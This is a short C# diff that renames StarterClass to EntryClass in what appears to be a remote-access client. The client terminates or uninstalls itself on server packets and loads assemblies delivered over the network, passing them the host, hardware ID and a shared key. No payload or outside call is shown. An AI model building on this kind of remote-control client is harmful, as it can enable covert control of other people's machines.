@@ -29,7 +29,7 @@ namespace Client
                 switch (packet.packetType)
                 {
                     case (PacketType.CLOSE_CLIENT):
-                        StarterClass.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
+                        EntryClass.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
                         break;
 
                     case (PacketType.UNINSTALL_CLOSE_CLIENT):
@@ -52,9 +52,9 @@ namespace Client
             object obj = assemblytoload.CreateInstance(method.Name);
             LoadingAPI loadingAPI = new LoadingAPI
             {
-                host = StarterClass.clientHandler.host,
-                baseIp = StarterClass.clientHandler.baseIp,
-                HWID = StarterClass.clientHandler.HWID,
+                host = EntryClass.clientHandler.host,
+                baseIp = EntryClass.clientHandler.baseIp,
+                HWID = EntryClass.clientHandler.HWID,
                 key = Config.generalKey,
                 currentPacket = packet,
             };
